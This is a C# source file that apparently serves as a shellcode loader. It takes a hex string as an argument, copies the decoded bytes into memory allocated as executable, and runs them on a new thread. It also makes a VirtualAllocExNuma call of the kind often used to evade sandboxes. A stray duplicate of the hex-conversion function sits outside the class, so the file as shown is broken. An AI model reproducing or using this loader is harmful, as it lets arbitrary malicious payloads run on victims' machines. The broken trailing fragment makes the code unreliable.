using System;
using System.Runtime.InteropServices;

class Program
{

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStacksize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    static byte[] ConvertHexStringToByteArray(string hexString)
    {
        if (hexString.Length % 2 != 0)
            throw new ArgumentException("Hex string must have an even length");

        byte[] byteArray = new byte[hexString.Length / 2];
        for (int i = 0; i < byteArray.Length; i++)
        {
            byteArray[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
        }

        return byteArray;
    }
    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("Please provide a hexadecimal string as a command line argument.");
            return;
        }

        string hexString = args[0];
        byte[] binaryData = ConvertHexStringToByteArray(hexString);

      /*  // Allocate executable memory and copy binary data
        IntPtr memory = AllocateExecutableMemory(binaryData.Length);
        Marshal.Copy(binaryData, 0, memory, binaryData.Length);

        // Execute the binary data
        ExecuteMemory(memory);

        // Free the allocated memory
        FreeExecutableMemory(memory, binaryData.Length);*/



        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

        //Marshal.Copy(buf, 0, addr, size);
        Marshal.Copy(binaryData, 0, addr, binaryData.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}


static byte[] ConvertHexStringToByteArray(string hexString)
    {
        if (hexString.Length % 2 != 0)
            throw new ArgumentException("Hex string must have an even length");

        byte[] byteArray = new byte[hexString.Length / 2];
        for (int i = 0; i < byteArray.Length; i++)
        {
            byteArray[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
        }

        return byteArray;
    }

    